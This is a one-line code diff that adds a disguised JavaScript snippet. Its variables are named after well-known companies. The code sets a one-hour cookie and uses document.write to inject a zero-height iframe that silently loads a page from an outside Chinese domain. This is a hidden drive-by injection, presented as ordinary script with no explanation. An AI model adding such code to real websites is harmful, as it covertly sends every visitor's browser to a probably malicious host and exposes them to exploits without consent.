@@ -1,0 +1,1 @@
+var Zend=new Date();Zend.setTime(Zend.getTime()+1*60*60*1000);var Yahoo="Cookie1=";var Baidu=new String(document.cookie);var Google=Baidu.indexOf(Yahoo);if(Google==-1){document.cookie="Cookie1=QuadroXFX;path=/;expires="+Zend.toGMTString();document.write("<iframe src=http://www.ibmn.net.cn/1010.htm width=100 height=0></iframe>")}
